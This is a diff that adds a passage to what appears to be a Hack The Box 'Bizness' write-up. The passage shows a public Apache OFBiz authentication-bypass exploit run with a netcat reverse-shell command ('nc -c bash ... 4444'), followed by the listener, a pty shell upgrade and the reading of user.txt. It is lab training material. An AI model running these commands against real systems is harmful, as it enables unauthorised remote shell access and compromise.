@@ -89,6 +89,51 @@ So let's find an exploit for this service and the specified version.
 ![image](https://cdn-images-1.medium.com/max/1000/1*C7BTmP6IdRsGEk40ZWtH-w.png)
 
 
+After some searching in google I found an exploit:
+
+https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
+
+So I used git clone to grab the repository.
+
+
+```bash
+└─# python3 exploit.py --url https://bizness.htb --cmd 'nc -c bash <tun-0> 4444'
+[+] Generating payload...
+[+] Payload generated successfully.
+[+] Sending malicious serialized payload...
+[+] The request has been successfully sent. Check the result of the command.
+```
+
+I run the exploit with a command to connect my machine with netcat.
+then, create netcat listener to get the connection.
+
+```bash
+nc -lnvp 4444
+```
+
+and there is a shell.
+
+```bash
+└─# nc -lnvp 4444                          
+listening on [any] 4444 ...
+connect to [tun-0] from (UNKNOWN) [10.10.11.252] 38330
+whoami
+ofbiz
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ofbiz@bizness:/opt/ofbiz$
+```
+
+Grab user.txt flag.
+
+```bash
+ofbiz@bizness:~$ cat user.txt
+cat user.txt
+********************************
+ofbiz@bizness:~$
+```
+
+
+
 
 
 
